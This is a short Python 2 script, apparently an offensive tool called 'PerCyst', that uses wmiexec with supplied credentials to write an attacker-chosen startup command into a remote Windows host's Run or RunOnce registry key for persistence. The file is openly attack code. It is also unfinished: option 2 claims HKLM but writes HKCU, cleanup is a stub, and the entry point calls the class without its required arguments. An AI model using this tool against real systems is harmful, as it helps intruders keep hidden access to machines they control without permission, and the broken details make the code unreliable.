import getpass
import wmiexec
import sys


# Author: Steve Laura

class RegRun:

    def __init__(self, ip, username, password, share):
        self.ip = ip
        self.username = username
        self.passwd = password
        self.share = share


    def setPercyst(self):
        #Menu to choose which Reg Key to write to
        print "Please choose the Registry key to use for PerCyst:"
        print "  1. HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        print "  2. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        print "  Q. Quit"
        choice = raw_input(">> ")

        #Setting the value for choice, or exiting if Quit was chosen
        if choice == str(1):
            choice = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        elif choice == str(2):
            choice = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        elif choice.lower() == 'q':
            print('\n[-] Thanks for using PerCyst\n')
            sys.exit()
        else:
            print('Invalid Choice')
            sys.exit()

        #Entering the name of the Registry String Value
        SZvalue =  raw_input("[!] Enter a name for the String value in the Registry: ")
        Command1 = raw_input("[!] Enter a command to run on Startup: ")

        cmd = 'REG ADD "' + choice + '" /V "' +SZvalue+ '" /t REG_SZ /F /D "' +Command1+ '"'
        self.runCmd(cmd)


    def cleanup(self):
        print('cleanup here')


    def runCmd(self, cmd):
        print("[+] Cyst attaching to host")
        execute1 = wmiexec.WMIEXEC(command=cmd, username=self.username, password=self.passwd, share=self.share)#, noOutput=True)
        execute1.run(self.ip)


    def ascii(self):
        print('perCYST\n\n<INSERT ASCII ART HERE>\n\n')


if __name__ == '__main__':
    RegRun().ascii()
